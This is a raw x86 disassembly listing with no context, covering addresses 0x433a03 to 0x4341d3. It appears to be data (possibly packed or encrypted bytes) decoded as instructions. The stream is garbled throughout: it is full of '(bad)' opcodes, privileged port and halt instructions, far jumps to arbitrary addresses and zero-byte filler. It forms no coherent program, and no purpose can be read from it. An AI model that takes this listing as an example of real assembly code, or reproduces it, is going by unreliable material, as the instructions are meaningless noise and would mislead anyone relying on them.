  433a03:	cmp    BYTE PTR [eax+eiz*1+0x29],dl
  433a07:	adc    eax,0x1928666
  433a0c:	cmp    al,0xed
  433a0e:	add    BYTE PTR [eax],al
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    bl,bh
  433a14:	aas    
  433a15:	div    DWORD PTR [esi+0x21]
  433a18:	ficom  WORD PTR ds:0x2fe9ac79
  433a1e:	push   cs
  433a1f:	jg     0x433a17
  433a21:	data16 aas 
  433a23:	jbe    0x433aa4
  433a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433a26:	(bad)
  433a2a:	retf   0xc2e1
  433a2d:	adc    al,0xd6
  433a2f:	jmp    0xfbf6cd73
  433a34:	cmp    al,0xb7
  433a36:	js     0x433a74
  433a38:	jmp    0x4339dd
  433a3a:	push   cs
  433a3b:	aas    
  433a3c:	mul    BYTE PTR [esi+0x3f]
  433a3f:	jbe    0x433a2a
  433a41:	cld    
  433a42:	js     0x433a05
  433a44:	cli    
  433a45:	outs   dx,BYTE PTR ds:[esi]
  433a46:	lods   eax,DWORD PTR ds:[esi]
  433a47:	pop    edx
  433a48:	push   0x532299e8
  433a4d:	mov    ch,0xad
  433a4f:	adc    ah,BYTE PTR [eax-0x7]
  433a52:	add    esi,DWORD PTR [ebp-0x7f]
  433a55:	and    ebp,edi
  433a57:	icebp  
  433a58:	ret    0x1bb
  433a5b:	cli    
  433a5c:	aad    0x5e
  433a5e:	mov    esi,0xbb48a06
  433a63:	add    DWORD PTR [edi],edi
  433a65:	out    dx,eax
  433a66:	(bad)  
  433a67:	std    
  433a68:	aas    
  433a69:	sbb    ecx,eax
  433a6b:	cmp    DWORD PTR [edx-0xa867e26],edi
  433a71:	add    al,BYTE PTR [ecx+edi*8]
  433a74:	fldl2e 
  433a76:	jle    0x433a78
  433a78:	add    BYTE PTR [eax],al
  433a7a:	add    BYTE PTR [eax],al
  433a7c:	out    dx,al
  433a7d:	add    al,BYTE PTR [eax]
  433a7f:	jmp    0xc9beaffa
  433a84:	jbe    0x433af4
  433a86:	outs   dx,DWORD PTR ds:[esi]
  433a87:	jb     0x433a7d
  433a89:	mov    dh,0x85
  433a8b:	and    al,0x5d
  433a8d:	das    
  433a8e:	clc    
  433a8f:	pop    edx
  433a90:	test   DWORD PTR [edi+0x53],edi
  433a93:	or     DWORD PTR [edi+0x1e910fe],ebp
  433a99:	jp     0x433a8f
  433a9b:	shl    BYTE PTR [edx+0x7d],cl
  433a9e:	inc    ebx
  433a9f:	mov    ebp,0xe9fc79fa
  433aa4:	add    dl,BYTE PTR [esi]
  433aa6:	test   DWORD PTR [esi*2-0x3f179966],ebp
  433aad:	push   edx
  433aae:	test   DWORD PTR [edi],ebp
  433ab0:	test   eax,0x6e815252
  433ab5:	xor    BYTE PTR [eax],al
  433ab7:	jmp    0x6457f8b7
  433abc:	xor    DWORD PTR [esi-0x3],ebp
  433abf:	imul   esi,DWORD PTR [edx],0xbd6e83fb
  433ac5:	sub    BYTE PTR [ebp-0x1c],bh
  433ac8:	pop    edx
  433ac9:	add    dh,BYTE PTR [edx+0x11]
  433acc:	cli    
  433acd:	js     0x433ac3
  433acf:	(bad)  
  433ad0:	les    esp,FWORD PTR [edx]
  433ad2:	test   DWORD PTR [edi-0x1abd809a],esi
  433ad8:	scas   eax,DWORD PTR es:[edi]
  433ad9:	inc    ebp
  433ada:	test   DWORD PTR [edi+0x36504472],ebp
  433ae0:	add    BYTE PTR [eax],al
  433ae2:	add    BYTE PTR [eax],al
  433ae4:	add    BYTE PTR [eax],ch
  433ae6:	ja     0x433aac
  433ae8:	fnstcw WORD PTR [ebx]
  433aea:	ret    
  433aeb:	je     0x433ae2
  433aed:	push   edi
  433aee:	ja     0x433ab5
  433af0:	push   ds
  433af1:	push   edi
  433af2:	jg     0x433ab1
  433af4:	mov    dl,0xf3
  433af6:	loopne 0x433b53
  433af8:	sub    ch,ah
  433afa:	into   
  433afb:	jae    0x433afd
  433afd:	sar    DWORD PTR [ebx+0x75],0x8
  433b01:	fsubr  QWORD PTR [ebp+eax*1-0x75]
  433b05:	dec    ecx
  433b06:	or     DWORD PTR [ecx+0xcc16],esi
  433b0c:	lea    edx,[ecx-0x6e]
  433b0f:	jmp    0x433ab6
  433b11:	daa    
  433b12:	dec    edx
  433b13:	or     al,0x85
  433b15:	int3   
  433b16:	ins    BYTE PTR es:[edi],dx
  433b17:	add    ecx,DWORD PTR [ebx+0x4d83ea61]
  433b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433b1e:	test   DWORD PTR [eax],edx
  433b20:	mov    DWORD PTR [edx+ecx*1+0x57],eax
  433b24:	pop    esi
  433b25:	pop    ss
  433b26:	mov    esp,0x61b18b53
  433b2b:	mov    ebx,0xccc428cc
  433b30:	int3   
  433b31:	sbb    ah,al
  433b33:	int3   
  433b34:	int3   
  433b35:	mov    eax,ds:0x918bec83
  433b3a:	sub    al,BYTE PTR [ebx+0x4d853c4d]
  433b40:	sbb    al,0x6c
  433b42:	cmp    DWORD PTR ds:0x45835d18,0x14
  433b49:	add    BYTE PTR [eax],al
  433b4b:	add    BYTE PTR [eax],al
  433b4d:	add    BYTE PTR [esi-0x7d],bl
  433b50:	dec    ebp
  433b51:	adc    ah,ch
  433b53:	test   BYTE PTR ds:0x624ded0c,bh
  433b59:	add    ah,bl
  433b5b:	test   BYTE PTR ds:0xf328b408,bh
  433b61:	(bad)  
  433b62:	mov    ebx,0xe920c47c
  433b67:	mov    ebp,0x84e10020
  433b6c:	in     al,dx
  433b6d:	push   esi
  433b6e:	xchg   edi,eax
  433b6f:	jp     0x433b79
  433b71:	test   DWORD PTR [edx+0x128d087a],edx
  433b77:	xchg   esi,eax
  433b78:	push   esi
  433b79:	pop    ebp
  433b7a:	jne    0x433ba3
  433b7c:	add    DWORD PTR [eax],eax
  433b7e:	out    dx,al
  433b7f:	fwait
  433b80:	jne    0x433b07
  433b82:	inc    ebx
  433b83:	jge    0x433bf0
  433b85:	add    BYTE PTR [edi-0x17],bl
  433b88:	imul   eax,DWORD PTR [eax],0x4f
  433b8b:	jmp    0x9c2f3bfb
  433b90:	push   ebp
  433b91:	data16 jne 0x433c02
  433b94:	xchg   esi,eax
  433b95:	fdiv   DWORD PTR [ebp-0x17]
  433b98:	std    
  433b99:	dec    ebp
  433b9a:	lock arpl WORD PTR [eax+eax*1-0x7ab2168b],ax
  433ba2:	mov    ebx,0xb25c4e72
  433ba7:	sbb    edx,DWORD PTR [eax+eax*1+0x75]
  433bab:	jmp    0xd76fcad
  433bb0:	add    al,0x0
  433bb2:	add    BYTE PTR [eax],al
  433bb4:	add    BYTE PTR [eax],al
  433bb6:	add    BYTE PTR [ebp-0x17],dh
  433bb9:	in     eax,0xce
  433bbb:	outs   dx,DWORD PTR ds:[esi]
  433bbc:	xchg   esp,eax
  433bbd:	inc    DWORD PTR [ebp+0x7dbdd82d]
  433bc3:	xor    ecx,ecx
  433bc5:	add    bh,0x82
  433bc8:	push   ebp
  433bc9:	les    edx,FWORD PTR [edi-0x789be504]
  433bcf:	stos   DWORD PTR es:[edi],eax
  433bd0:	add    eax,0x69bbf8b
  433bd5:	ret    0x7504
  433bd8:	sub    eax,0x2539ccd0
  433bdd:	ror    ah,1
  433bdf:	xor    DWORD PTR [esi+0x60c3ec8c],esi
  433be5:	jno    0x433bef
  433be7:	clc    
  433be8:	xor    dh,BYTE PTR [ecx+0x8]
  433beb:	clc    
  433bec:	call   0x8:0x27a05a9b
  433bf3:	out    dx,al
  433bf4:	call   0x768b:0x23b055d
  433bfb:	jae    0x433bb7
  433bfd:	jnp    0x433c00
  433bff:	fcomip st,st(2)
  433c01:	mov    cl,0x5e
  433c03:	sbb    edi,esi
  433c05:	out    0x8c,al
  433c07:	daa    
  433c08:	cmp    bl,BYTE PTR [edx+0x68364f8c]
  433c0e:	(bad)  
  433c0f:	mov    esp,0x4603e7f2
  433c14:	(bad)  
  433c15:	arpl   WORD PTR [ecx],ax
  433c17:	sub    BYTE PTR [ebx],dl
  433c19:	outs   dx,BYTE PTR ds:[esi]
  433c1a:	dec    ecx
  433c1b:	add    BYTE PTR [eax],al
  433c1d:	add    BYTE PTR [eax],al
  433c1f:	add    BYTE PTR [ebp-0x79],al
  433c22:	sub    DWORD PTR [eax+0x20],ebx
  433c25:	ret    0x84e8
  433c28:	stos   BYTE PTR es:[edi],al
  433c29:	add    DWORD PTR [esi],ecx
  433c2b:	mov    BYTE PTR [esi],0x3
  433c2e:	(bad)  
  433c2f:	rol    BYTE PTR [esi],1
  433c31:	pop    es
  433c32:	sbb    bh,BYTE PTR [ecx+eiz*8+0x1e00b2f2]
  433c39:	push   ebp
  433c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433c3b:	pop    es
  433c3c:	jne    0x433cbb
  433c3e:	jno    0x433bf3
  433c40:	jne    0x433c44
  433c42:	out    0x4,eax
  433c44:	out    dx,eax
  433c45:	sahf   
  433c46:	out    0x3,eax
  433c48:	jne    0x433cc7
  433c4a:	jno    0x433bf7
  433c4c:	jne    0x433c50
  433c4e:	out    0x6d,eax
  433c50:	jne    0x433cae
  433c52:	out    0x8e,eax
  433c54:	mov    ecx,0xb702c113
  433c59:	dec    edx
  433c5a:	std    
  433c5b:	add    ebx,DWORD PTR [ebx-0x36a699fe]
  433c61:	add    ah,BYTE PTR [esi+0x49]
  433c64:	lds    eax,FWORD PTR [ebx]
  433c66:	mov    ebp,0x66029303
  433c6b:	pop    ecx
  433c6c:	test   eax,0x2d917402
  433c71:	add    esp,edi
  433c73:	add    esi,DWORD PTR [edx-0x9a0ff81]
  433c79:	add    al,BYTE PTR [eax]
  433c7b:	jmp    0x1205c3c8
  433c80:	cmp    eax,0x1ef9
  433c86:	add    BYTE PTR [eax],al
  433c88:	add    cl,dh
  433c8a:	mov    edx,0xc6f1292d
  433c8f:	and    BYTE PTR [edi+edi*4-0x5],ah
  433c93:	xchg   ebx,eax
  433c94:	sub    DWORD PTR [ebp-0x67],edx
  433c97:	xchg   DWORD PTR [edi-0x72ad76aa],esp
  433c9d:	jmp    0xb8cf9753
  433ca2:	push   es
  433ca3:	add    BYTE PTR [ebp-0x5233413b],dh
  433ca9:	lds    edi,FWORD PTR [esi-0x2111c334]
  433caf:	test   DWORD PTR [ecx+eax*4],esp
  433cb2:	xchg   DWORD PTR [ebx-0x27],ecx
  433cb5:	neg    esi
  433cb7:	or     BYTE PTR [esi],dl
  433cb9:	inc    esi
  433cba:	jmp    0x433c43
  433cbc:	icebp  
  433cbd:	out    dx,eax
  433cbe:	inc    ebp
  433cbf:	or     al,0x60
  433cc1:	mov    cl,0x89
  433cc3:	js     0x433cb2
  433cc5:	stc    
  433cc6:	cmp    BYTE PTR [ebp-0x6c104ec9],al
  433ccc:	mov    cl,0x71
  433cce:	add    al,BYTE PTR [eax]
  433cd0:	bound  edi,QWORD PTR [ebx+0x556f0d3e]
  433cd6:	add    al,BYTE PTR [eax]
  433cd8:	jmp    0x1e7378cc
  433cdd:	mov    eax,ds:0x21174f40
  433ce2:	hlt    
  433ce3:	sub    eax,0xc46f76e9
  433ce8:	cmc    
  433ce9:	in     eax,dx
  433cea:	shl    DWORD PTR [ecx+eiz*8+0x0],0x0
  433cef:	add    BYTE PTR [eax],al
  433cf1:	add    bh,dh
  433cf3:	mov    ecx,0xe4ffaef9
  433cf8:	pop    ebx
  433cf9:	add    BYTE PTR [edi+0x7d],bl
  433cfc:	xor    BYTE PTR ds:[ecx-0x68ad03b5],dl
  433d03:	shr    al,0x29
  433d06:	scas   eax,DWORD PTR es:[edi]
  433d07:	icebp  
  433d08:	test   DWORD PTR [ebx-0x3f830568],0xcf7afa08
  433d12:	sbb    ebp,0x6
  433d15:	add    DWORD PTR [ecx],0xdf4b50f1
  433d1b:	or     BYTE PTR [ebp+eax*1-0x7d],dh
  433d1f:	(bad)  
  433d20:	idiv   edi
  433d22:	ret    
  433d23:	xchg   ecx,eax
  433d24:	cmp    eax,0x3e7c0cfc
  433d29:	xor    BYTE PTR [edi],ah
  433d2b:	mov    edi,0xefbea1e8
  433d30:	test   DWORD PTR [ebx-0x3f82f738],0xcf7b0528
  433d3a:	mov    bl,0x7b
  433d3c:	xor    BYTE PTR ds:[ecx],dl
  433d3f:	push   edx
  433d40:	clc    
  433d41:	push   ecx
  433d42:	pop    ss
  433d43:	mov    edi,0xf12e89e8
  433d48:	test   DWORD PTR [ebx-0x3f82f7e8],0xcf7b0388
  433d52:	add    edi,DWORD PTR [ebp+0x3e]
  433d55:	xor    BYTE PTR [eax],al
  433d57:	add    BYTE PTR [eax],al
  433d59:	add    BYTE PTR [eax],al
  433d5b:	mov    cl,0x4a
  433d5d:	cld    
  433d5e:	push   edx
  433d5f:	(bad)  
  433d60:	mov    ebp,0xf0be71e8
  433d65:	test   DWORD PTR [ebx-0x3f82f7f8],0xcf7afb28
  433d6f:	xchg   ebx,eax
  433d70:	fcomp  QWORD PTR [edx]
  433d72:	test   ebx,eax
  433d74:	push   0x16
  433d76:	mov    esi,DWORD PTR [ebp+0x5f]
  433d79:	mov    DWORD PTR [eax],eax
  433d7b:	jne    0x433d56
  433d7d:	cmp    al,0x43
  433d7f:	or     DWORD PTR [edi-0x49ca7cf5],ebp
  433d85:	or     bh,BYTE PTR [ebp-0x3]
  433d88:	in     eax,0x71
  433d8a:	push   es
  433d8b:	div    BYTE PTR [ecx]
  433d8d:	add    eax,0x9c687074
  433d92:	stc    
  433d93:	loop   0x433da5
  433d95:	nop
  433d96:	inc    ebx
  433d97:	fldcw  WORD PTR [ecx+0x64854286]
  433d9d:	retf   
  433d9e:	call   0xfa3f2983
  433da3:	mul    BYTE PTR ds:0x6db58301
  433da9:	(bad)  
  433daa:	jl     0x433d6e
  433dac:	loopne 0x433d35
  433dae:	inc    edx
  433daf:	gs jbe 0x433dfb
  433db2:	cld    
  433db3:	inc    esi
  433db4:	sub    al,BYTE PTR [edi-0x11aa7236]
  433dba:	stc    
  433dbb:	xchg   edx,eax
  433dbc:	arpl   WORD PTR [ecx-0x8],bx
  433dbf:	add    BYTE PTR [eax],al
  433dc1:	add    BYTE PTR [eax],al
  433dc3:	add    dh,dh
  433dc5:	popf   
  433dc6:	or     BYTE PTR [ebx+0x7d0135b5],al
  433dcc:	stos   BYTE PTR es:[edi],al
  433dcd:	mov    eax,0x9ff817e7
  433dd2:	jno    0x433de7
  433dd4:	(bad)  
  433dd5:	sub    eax,0x750b3600
  433dda:	add    al,0x0
  433ddc:	jne    0x433deb
  433dde:	push   es
  433ddf:	repnz ss loope 0x433e55
  433de3:	add    ecx,DWORD PTR [edx]
  433de5:	(bad)  
  433de6:	sti    
  433de7:	stc    
  433de8:	inc    edx
  433de9:	pop    esi
  433dea:	inc    ecx
  433deb:	cld    
  433dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ded:	fs inc edx
  433def:	xor    dh,bh
  433df1:	mov    gs,esp
  433df3:	inc    edx
  433df4:	daa    
  433df5:	add    ah,BYTE PTR [edx-0x3]
  433df8:	mov    al,ds:0x3586e3c6
  433dfd:	jbe    0x433deb
  433dff:	cmp    BYTE PTR [edi+ebp*8],0x3e
  433e03:	sub    al,0xf0
  433e05:	cmp    al,0x43
  433e07:	or     DWORD PTR [edx],0xf623b3ef
  433e0d:	out    dx,al
  433e0e:	mov    esp,0xeec2a01f
  433e13:	lea    ecx,ds:0x6603e702
  433e19:	cli    
  433e1a:	fld    QWORD PTR [ebp+0x3e701f9]
  433e20:	dec    ecx
  433e21:	cld    
  433e22:	adc    cl,al
  433e24:	jge    0x433e9b
  433e26:	in     al,dx
  433e27:	mov    esp,0x0
  433e2c:	add    dl,ch
  433e2e:	out    dx,al
  433e2f:	cli    
  433e30:	cld    
  433e31:	lock inc edi
  433e33:	mov    bh,0x8e
  433e35:	ds out dx,al
  433e37:	cwde   
  433e38:	mov    BYTE PTR [edi-0x630e1427],bh
  433e3e:	out    dx,al
  433e3f:	data16 (bad) 
  433e41:	jno    0x433dc8
  433e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433e44:	ja     0x433ebc
  433e46:	sbb    DWORD PTR [edx+0x6e1990fc],0x4e
  433e4d:	add    DWORD PTR [edx+0x2201fcc0],0xee6fc6c
  433e57:	test   bl,0xa0
  433e5a:	jl     0x433ea3
  433e5c:	add    esi,DWORD PTR [ebp+0x2]
  433e5f:	adc    al,0xc
  433e61:	mov    al,ds:0x75034b84
  433e66:	add    dl,BYTE PTR [ebx]
  433e68:	or     al,BYTE PTR [edi-0x3e]
  433e6b:	out    dx,eax
  433e6c:	jbe    0x433ee4
  433e6e:	lods   eax,DWORD PTR ds:[esi]
  433e6f:	pusha  
  433e70:	cld    
  433e71:	cmp    al,0xee
  433e73:	add    BYTE PTR [edx-0x48],ah
  433e76:	xor    cl,BYTE PTR [ebx-0x7ac2d6ec]
  433e7c:	aaa    
  433e7d:	push   cs
  433e7e:	dec    ebp
  433e7f:	out    dx,eax
  433e80:	pop    esi
  433e81:	sbb    DWORD PTR [eax-0x390aaea5],ecx
  433e87:	add    al,0x64
  433e89:	ss ja  0x433e8f
  433e8c:	push   0x31
  433e8e:	in     al,dx
  433e8f:	in     eax,0xd8
  433e91:	add    BYTE PTR [eax],al
  433e93:	add    BYTE PTR [eax],al
  433e95:	add    bl,dh
  433e97:	jmp    0x433f0c
  433e99:	in     al,0xad
  433e9b:	mov    BYTE PTR [eax+0x740276e9],ch
  433ea1:	in     al,dx
  433ea2:	and    DWORD PTR [esi-0x7826e107],edx
  433ea8:	inc    ebx
  433ea9:	loope  0x433f22
  433eab:	or     cl,BYTE PTR [ebx-0x7aad315c]
  433eb1:	scas   eax,DWORD PTR es:[edi]
  433eb2:	xchg   BYTE PTR [edi-0x2276ee36],al
  433eb8:	stc    
  433eb9:	div    BYTE PTR [edx]
  433ebb:	mov    BYTE PTR [esp+eiz*2],0xb6
  433ebf:	jbe    0x433ebe
  433ec1:	imul   ebp,DWORD PTR [esi+0x6d2485eb],0x4bf95387
  433ecb:	(bad)  
  433ece:	test   eax,0x6be90002
  433ed3:	js     0x433eb1
  433ed5:	jmp    0xaac04150
  433eda:	(bad)  
  433edb:	outs   dx,DWORD PTR ds:[esi]
  433edc:	iret   
  433edd:	jmp    0x31ca48db
  433ee2:	jne    0x433e6b
  433ee4:	inc    ebx
  433ee5:	mov    eax,ds:0x600838ea
  433eea:	jnp    0x433ed9
  433eec:	add    BYTE PTR [edx],dh
  433eee:	cli    
  433eef:	ret    0x59
  433ef2:	(bad)  
  433ef3:	jecxz  0x433f4a
  433ef5:	ret    
  433ef6:	or     BYTE PTR [edx+0xcccc],bh
  433efc:	add    BYTE PTR [eax],al
  433efe:	add    BYTE PTR [ecx-0x577c1383],dl
  433f04:	adc    al,BYTE PTR [ebx-0x35cbdbbb]
  433f0a:	mov    ecx,esp
  433f0c:	hlt    
  433f0d:	xor    eax,edx
  433f0f:	xor    esi,edi
  433f11:	test   BYTE PTR [edx-0x7a],al
  433f14:	jge    0x433ef3
  433f16:	pop    ebp
  433f17:	dec    esi
  433f18:	cli    
  433f19:	call   DWORD PTR [ebp-0x79]
  433f1c:	mov    dh,0xe0
  433f1e:	add    ah,bl
  433f20:	add    BYTE PTR [ebx],dh
  433f22:	repnz and DWORD PTR ds:0xe99b9ab8,eax
  433f29:	neg    DWORD PTR [esi+0x67]
  433f2c:	jecxz  0x433f83
  433f2e:	ret    0xd8
  433f31:	xor    DWORD PTR [esi],edx
  433f33:	loope  0x433f39
  433f35:	mov    eax,0xf7e97b9c
  433f3a:	pop    esi
  433f3b:	inc    edi
  433f3c:	jecxz  0x433f93
  433f3e:	ret    0x98
  433f41:	dec    ebx
  433f42:	mov    edi,ecx
  433f44:	adc    BYTE PTR [ebx],dh
  433f46:	fiadd  DWORD PTR [ecx-0x4]
  433f49:	push   edx
  433f4a:	xor    ecx,esp
  433f4c:	dec    edx
  433f4d:	and    ebp,0x49
  433f50:	les    ecx,FWORD PTR [eax+eax*1]
  433f53:	pop    ss
  433f54:	inc    edx
  433f55:	or     al,0x89
  433f57:	push   edx
  433f58:	push   ss
  433f59:	sbb    DWORD PTR [esi-0x60],0x5c848e2b
  433f60:	add    BYTE PTR [eax],al
  433f62:	jb     0x433f64
  433f64:	add    BYTE PTR [eax],al
  433f66:	add    BYTE PTR [eax],al
  433f68:	inc    edi
  433f69:	jno    0x433f73
  433f6b:	cmp    edi,edx
  433f6d:	jg     0x433f6f
  433f6f:	add    BYTE PTR [edx+esi*2+0x9],cl
  433f73:	cmp    DWORD PTR [ebp+0x6b],esi
  433f76:	lds    eax,FWORD PTR [eax]
  433f78:	jne    0x433f53
  433f7a:	jo     0x433f83
  433f7c:	out    dx,al
  433f7d:	jae    0x433ffc
  433f7f:	add    BYTE PTR [ebp-0x27],dh
  433f82:	mov    WORD PTR [edx-0x77],cs
  433f85:	or     al,0x89
  433f87:	jp     0x434006
  433f89:	test   al,0xbd
  433f8b:	test   DWORD PTR [edx],esi
  433f8d:	fld    DWORD PTR [edi+0x78]
  433f90:	xchg   BYTE PTR [ebx-0x37daca8f],ah
  433f96:	(bad)  
  433f98:	jno    0x433faa
  433f9a:	(bad)  [edx+0x65]
  433f9d:	add    cl,BYTE PTR [esi-0x2268a38]
  433fa3:	jae    0x434022
  433fa5:	pusha  
  433fa6:	dec    edi
  433fa7:	js     0x43401f
  433fa9:	adc    al,0x8c
  433fab:	push   edx
  433fac:	mov    DWORD PTR [eax+0x77],ebx
  433faf:	adc    al,0x75
  433fb1:	fdivr  QWORD PTR [edi-0x50]
  433fb4:	je     0x433f8f
  433fb6:	std    
  433fb7:	jl     0x434004
  433fb9:	loope  0x433fb8
  433fbb:	or     al,bh
  433fbd:	pusha  
  433fbe:	std    
  433fbf:	push   DWORD PTR [ebp+0x70]
  433fc2:	aas    
  433fc3:	jl     0x433fc3
  433fc5:	mov    ds:0x76b58375,eax
  433fca:	add    eax,0x83
  433fcf:	add    BYTE PTR [eax],al
  433fd1:	lods   al,BYTE PTR ds:[esi]
  433fd2:	hlt    
  433fd3:	jns    0x433f5c
  433fd5:	jne    0x433fb0
  433fd7:	std    
  433fd8:	mov    eax,0x41975
  433fdd:	lock cdq 
  433fdf:	outs   dx,DWORD PTR ds:[esi]
  433fe0:	sysret 
  433fe2:	fnstsw WORD PTR [ecx+ecx*8]
  433fe5:	push   es
  433fe6:	lock mov WORD PTR [edx-0x13],?
  433fea:	pop    esi
  433feb:	test   DWORD PTR [ecx],0xfffd62f1
  433ff1:	jne    0x433ff5
  433ff3:	outs   dx,BYTE PTR ds:[esi]
  433ff4:	xor    BYTE PTR ds:0x5003e702,0x45
  433ffb:	daa    
  433ffc:	(bad)  
  433ffd:	inc    ebp
  433fff:	out    0x3,eax
  434001:	jne    0x434012
  434003:	xor    DWORD PTR [eax-0x10],eax
  434006:	xchg   ebx,eax
  434007:	xor    eax,DWORD PTR [esi*2-0x45fc02fe]
  43400e:	push   edx
  43400f:	adc    eax,0xe779f787
  434014:	add    esi,DWORD PTR [ebp+0x52]
  434017:	dec    edi
  434018:	jmp    0x852a4262
  43401d:	xor    DWORD PTR [esi],edx
  43401f:	les    ebp,FWORD PTR fs:[ebp+eax*4-0x5c]
  434024:	add    dh,BYTE PTR [ebp+0x2]
  434027:	outs   dx,BYTE PTR ds:[esi]
  434028:	or     bh,al
  43402a:	xchg   ebx,eax
  43402b:	jnp    0x434031
  43402d:	jne    0x434031
  43402f:	pop    esi
  434030:	sbb    BYTE PTR [ecx],0x2
  434033:	out    0x3,eax
  434035:	add    BYTE PTR [eax],al
  434037:	add    BYTE PTR [eax],al
  434039:	add    BYTE PTR [ecx+edx*2+0x6e],al
  43403d:	mov    al,BYTE PTR [ecx]
  43403f:	add    ah,bh
  434041:	add    edi,DWORD PTR [ebx]
  434043:	push   edx
  434044:	or     dl,bl
  434046:	inc    eax
  434047:	(bad)  
  434048:	xlat   BYTE PTR ds:[ebx]
  434049:	cmp    al,0xb4
  43404b:	cli    
  43404c:	arpl   WORD PTR [edx+esi*4],di
  43404f:	jmp    0x327:0x2f878ce7
  434056:	pop    ds
  434057:	inc    edx
  434058:	jo     0x4340ab
  43405a:	jno    0x4340d5
  43405c:	pop    ecx
  43405d:	or     al,0x82
  43405f:	inc    esp
  434060:	sub    ebp,DWORD PTR [ebx]
  434062:	punpckhdq mm6,mm0
  434065:	inc    ecx
  434066:	add    DWORD PTR [edi+0x69],esi
  434069:	mov    ebx,0x7ee70275
  43406e:	xor    eax,0xfe6cfffa
  434073:	add    al,BYTE PTR [eax]
  434075:	jmp    0xea0bed73
  43407a:	jbe    0x43407e
  43407c:	add    BYTE PTR [esp+ecx*8],dl
  43407f:	addr16 clc 
  434081:	in     eax,0x7d
  434083:	jle    0x434064
  434085:	jmp    0x2fc84300
  43408a:	pop    ecx
  43408b:	jg     0x4340d7
  43408d:	fldenv [eax+0x751f8ce8]
  434093:	cmp    BYTE PTR [edi+0x4b822524],al
  434099:	stc    
  43409a:	push   cs
  43409b:	dec    ecx
  43409c:	adc    eax,0xe9
  4340a1:	add    BYTE PTR [eax],al
  4340a3:	jbe    0x434026
  4340a5:	inc    ebx
  4340a6:	loope  0x434033
  4340a8:	ret    0xdc78
  4340ab:	stc    
  4340ac:	ins    BYTE PTR es:[edi],dx
  4340ad:	sbb    al,0xe9
  4340af:	mov    al,BYTE PTR [ebx]
  4340b1:	shl    DWORD PTR [esi+edi*2-0x12c90613],0x7f
  4340b9:	pop    edx
  4340ba:	shr    DWORD PTR [ecx-0x76dd7a3e],1
  4340c0:	ins    DWORD PTR es:[edi],dx
  4340c1:	hlt    
  4340c2:	jb     0x434082
  4340c4:	movsx  ebp,ax
  4340c7:	dec    esp
  4340c8:	pop    edx
  4340c9:	test   DWORD PTR [edi-0x6bc7eba],ebx
  4340cf:	fs inc esp
  4340d1:	ins    BYTE PTR es:[edi],dx
  4340d2:	jb     0x434147
  4340d4:	adc    dl,BYTE PTR [ecx-0x67]
  4340d7:	inc    edi
  4340d8:	ficom  DWORD PTR [edi+0x270276ba]
  4340de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4340df:	icebp  
  4340e0:	add    al,BYTE PTR [eax]
  4340e2:	jmp    0x613396e6
  4340e7:	dec    ebx
  4340e8:	jb     0x434101
  4340ea:	ja     0x4340e1
  4340ec:	add    al,BYTE PTR [eax]
  4340ee:	add    BYTE PTR [esp+ebx*1+0x43e7f455],cl
  4340f5:	or     BYTE PTR [ecx],al
  4340f7:	sub    edx,0x594df87b
  4340fd:	jae    0x434084
  4340ff:	or     al,0x73
  434101:	jb     0x4340ee
  434103:	addr16 jge 0x434144
  434106:	or     BYTE PTR [eax],al
  434108:	add    BYTE PTR [eax],al
  43410a:	add    BYTE PTR [eax],al
  43410c:	fnstcw WORD PTR [esi+0x40d7086d]
  434112:	js     0x43411f
  434114:	sub    BYTE PTR [edx+0x74],0x66
  434118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434119:	jo     0x43412f
  43411b:	cmp    esp,DWORD PTR [esp+esi*2+0x35a48afa]
  434122:	rol    BYTE PTR [ebp-0x14f18d6d],0x1f
  434129:	jp     0x43416c
  43412b:	add    BYTE PTR [edi+0x88a0438],dl
  434131:	adc    eax,0x7d1c4e83
  434136:	adc    al,0x8
  434138:	sbb    al,0x2c
  43413a:	mov    edi,0x3e7d3372
  43413f:	adc    BYTE PTR [edi+0x40],dl
  434142:	jo     0x43419b
  434144:	mov    edi,0xe47df9cb
  434149:	push   esp
  43414a:	dec    ecx
  43414b:	adc    DWORD PTR [edx],eax
  43414d:	popa   
  43414e:	call   0x47e07c
  434153:	sub    DWORD PTR [edx],esi
  434155:	jle    0x434157
  434157:	add    BYTE PTR [ebp+esi*2-0x713a8fc2],bl
  43415e:	test   BYTE PTR [eax],al
  434160:	mov    WORD PTR [ecx+eiz*1],es
  434163:	jle    0x434109
  434165:	adc    eax,0x6e9d1476
  43416a:	adc    BYTE PTR [ecx],al
  43416c:	jne    0x4341bf
  43416e:	add    bh,bh
  434170:	add    BYTE PTR [eax],al
  434172:	add    BYTE PTR [eax],al
  434174:	add    BYTE PTR [eax],al
  434176:	repz add al,0x7b
  434179:	jns    0x4341d6
  43417b:	jae    0x434191
  43417d:	jne    0x434157
  43417f:	jp     0x4341d1
  434181:	imul   esi,DWORD PTR [ecx-0x6a477a0e],0x52
  434188:	push   ebp
  434189:	mov    ebx,0x375be074
  43418e:	(bad)  
  43418f:	std    
  434190:	pop    eax
  434191:	scas   al,BYTE PTR es:[edi]
  434192:	int3   
  434193:	mov    ebp,0x587eee5a
  434198:	mov    esi,0x5552d969
  43419d:	div    BYTE PTR [ecx+0x76fe5af2]
  4341a3:	pop    eax
  4341a4:	mov    esi,0xccc1d971
  4341a9:	sub    DWORD PTR [esi],ebp
  4341ab:	ror    esp,0x41
  4341ae:	push   ss
  4341af:	ror    esp,0x39
  4341b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4341b3:	xchg   ah,ch
  4341b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4341b6:	mov    al,0x86
  4341b8:	jnp    0x434227
  4341ba:	in     al,dx
  4341bb:	(bad)  
  4341bc:	xor    edx,0xffffffae
  4341bf:	or     al,0x59
  4341c1:	clc    
  4341c2:	pushf  
  4341c3:	xchg   edi,eax
  4341c4:	push   ebp
  4341c5:	inc    eax
  4341c6:	sbb    edi,ecx
  4341c8:	inc    DWORD PTR [eax+0x74]
  4341cb:	stos   BYTE PTR es:[edi],al
  4341cc:	loopne 0x434243
  4341ce:	fscale 
  4341d0:	add    bl,0x86
  4341d3:	pop    es
